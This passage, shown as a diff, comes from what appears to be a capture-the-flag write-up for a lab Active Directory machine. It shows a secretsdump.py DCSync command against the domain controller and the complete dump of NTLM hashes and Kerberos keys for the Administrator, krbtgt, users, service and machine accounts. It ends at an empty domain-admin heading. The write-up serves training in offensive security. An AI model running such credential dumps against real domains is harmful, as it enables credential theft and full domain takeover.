@@ -442,4 +442,83 @@ SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\dc01$ from 
 ```
 It works now i can perform a DCSync to dump the administrators hash
 
+```python
+secretsdump.py -k -no-pass -dc-ip "10.129.231.205" @dc01.vintage.htb
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
 
+[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:468c7497513f8243b59980f2240a10de:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:be3d376d906753c7373b15ac460724d8:::
+M.Rossi:1111:aad3b435b51404eeaad3b435b51404ee:8e5fc7685b7ae019a516c2515bbd310d:::
+R.Verdi:1112:aad3b435b51404eeaad3b435b51404ee:42232fb11274c292ed84dcbcc200db57:::
+L.Bianchi:1113:aad3b435b51404eeaad3b435b51404ee:de9f0e05b3eaa440b2842b8fe3449545:::
+G.Viola:1114:aad3b435b51404eeaad3b435b51404ee:1d1c5d252941e889d2f3afdd7e0b53bf:::
+C.Neri:1115:aad3b435b51404eeaad3b435b51404ee:cc5156663cd522d5fa1931f6684af639:::
+P.Rosa:1116:aad3b435b51404eeaad3b435b51404ee:8c241d5fe65f801b408c96776b38fba2:::
+svc_sql:1134:aad3b435b51404eeaad3b435b51404ee:cc5156663cd522d5fa1931f6684af639:::
+svc_ldap:1135:aad3b435b51404eeaad3b435b51404ee:458fd9b330df2eff17c42198627169aa:::
+svc_ark:1136:aad3b435b51404eeaad3b435b51404ee:1d1c5d252941e889d2f3afdd7e0b53bf:::
+C.Neri_adm:1140:aad3b435b51404eeaad3b435b51404ee:91c4418311c6e34bd2e9a3bda5e96594:::
+L.Bianchi_adm:1141:aad3b435b51404eeaad3b435b51404ee:6b751449807e0d73065b0423b64687f0:::
+DC01$:1002:aad3b435b51404eeaad3b435b51404ee:2dc5282ca43835331648e7e0bd41f2d5:::
+gMSA01$:1107:aad3b435b51404eeaad3b435b51404ee:0851299c01b944d01099fc977eaa6c67:::
+FS01$:1108:aad3b435b51404eeaad3b435b51404ee:44a59c02ec44a90366ad1d0f8a781274:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:5f22c4cf44bc5277d90b8e281b9ba3735636bd95a72f3870ae3de93513ce63c5
+Administrator:aes128-cts-hmac-sha1-96:c119630313138df8cd2e98b5e2d018f7
+Administrator:des-cbc-md5:c4d5072368c27fba
+krbtgt:aes256-cts-hmac-sha1-96:8d969dafdd00d594adfc782f13ababebbada96751ec4096bce85e122912ce1f0
+krbtgt:aes128-cts-hmac-sha1-96:3c7375304a46526c00b9a7c341699bc0
+krbtgt:des-cbc-md5:e923e308752658df
+M.Rossi:aes256-cts-hmac-sha1-96:14d4ea3f6cd908d23889e816cd8afa85aa6f398091aa1ab0d5cd1710e48637e6
+M.Rossi:aes128-cts-hmac-sha1-96:3f974cd6254cb7808040db9e57f7e8b4
+M.Rossi:des-cbc-md5:7f2c7c982cd64361
+R.Verdi:aes256-cts-hmac-sha1-96:c3e84a0d7b3234160e092f168ae2a19366465d0a4eab1e38065e79b99582ea31
+R.Verdi:aes128-cts-hmac-sha1-96:d146fa335a9a7d2199f0dd969c0603fb
+R.Verdi:des-cbc-md5:34464a58618f8938
+L.Bianchi:aes256-cts-hmac-sha1-96:abcbbd86203a64f177288ed73737db05718cead35edebd26740147bd73e9cfed
+L.Bianchi:aes128-cts-hmac-sha1-96:92067d46b54cdb11b4e9a7e650beb122
+L.Bianchi:des-cbc-md5:01f2d667a19bce25
+G.Viola:aes256-cts-hmac-sha1-96:f3b3398a6cae16ec640018a13a1e70fc38929cfe4f930e03b1c6f1081901844a
+G.Viola:aes128-cts-hmac-sha1-96:367a8af99390ebd9f05067ea4da6a73b
+G.Viola:des-cbc-md5:7f19b9cde5dce367
+C.Neri:aes256-cts-hmac-sha1-96:c8b4d30ca7a9541bdbeeba0079f3a9383b127c8abf938de10d33d3d7c3b0fd06
+C.Neri:aes128-cts-hmac-sha1-96:0f922f4956476de10f59561106aba118
+C.Neri:des-cbc-md5:9da708a462b9732f
+P.Rosa:aes256-cts-hmac-sha1-96:f9c16db419c9d4cb6ec6242484a522f55fc891d2ff943fc70c156a1fab1ebdb1
+P.Rosa:aes128-cts-hmac-sha1-96:1cdedaa6c2d42fe2771f8f3f1a1e250a
+P.Rosa:des-cbc-md5:a423fe64579dae73
+svc_sql:aes256-cts-hmac-sha1-96:3bc255d2549199bbed7d8e670f63ee395cf3429b8080e8067eeea0b6fc9941ae
+svc_sql:aes128-cts-hmac-sha1-96:bf4c77d9591294b218b8280c7235c684
+svc_sql:des-cbc-md5:2ff4022a68a7834a
+svc_ldap:aes256-cts-hmac-sha1-96:d5cb431d39efdda93b6dbcf9ce2dfeffb27bd15d60ebf0d21cd55daac4a374f2
+svc_ldap:aes128-cts-hmac-sha1-96:cfc747dd455186dba6a67a2a340236ad
+svc_ldap:des-cbc-md5:e3c48675a4671c04
+svc_ark:aes256-cts-hmac-sha1-96:820c3471b64d94598ca48223f4a2ebc2491c0842a84fe964a07e4ee29f63d181
+svc_ark:aes128-cts-hmac-sha1-96:55aec332255b6da8c1344357457ee717
+svc_ark:des-cbc-md5:6e2c9b15bcec6e25
+C.Neri_adm:aes256-cts-hmac-sha1-96:96072929a1b054f5616e3e0d0edb6abf426b4a471cce18809b65559598d722ff
+C.Neri_adm:aes128-cts-hmac-sha1-96:ed3b9d69e24d84af130bdc133e517af0
+C.Neri_adm:des-cbc-md5:5d6e9dd675042fa7
+L.Bianchi_adm:aes256-cts-hmac-sha1-96:529fa80540d759052c6beb161d5982435a37811b3ad2a338e81b75797c11959e
+L.Bianchi_adm:aes128-cts-hmac-sha1-96:7e4599a7f84c2868e20141bdc8608bd7
+L.Bianchi_adm:des-cbc-md5:8fa746971a98fedf
+DC01$:aes256-cts-hmac-sha1-96:f8ceb2e0ea58bf929e6473df75802ec8efcca13135edb999fcad20430dc06d4b
+DC01$:aes128-cts-hmac-sha1-96:a8f037cb02f93e9b779a84441be1606a
+DC01$:des-cbc-md5:c4f15ef8c4f43134
+gMSA01$:aes256-cts-hmac-sha1-96:f4d64527410f21236212dfd8967e227d8da02eca96608d82c0b9d44b20196fc8
+gMSA01$:aes128-cts-hmac-sha1-96:5c8b89785e70073c70ae512053349d86
+gMSA01$:des-cbc-md5:ae314cb68cec2f67
+FS01$:aes256-cts-hmac-sha1-96:d57d94936002c8725eab5488773cf2bae32328e1ba7ffcfa15b81d4efab4bb02
+FS01$:aes128-cts-hmac-sha1-96:ddf2a2dcc7a6080ea3aafbdf277f4958
+FS01$:des-cbc-md5:dafb3738389e205b
+[*] Cleaning up...
+```
+
+## Auth as the Domain admin
+```python
+
+```
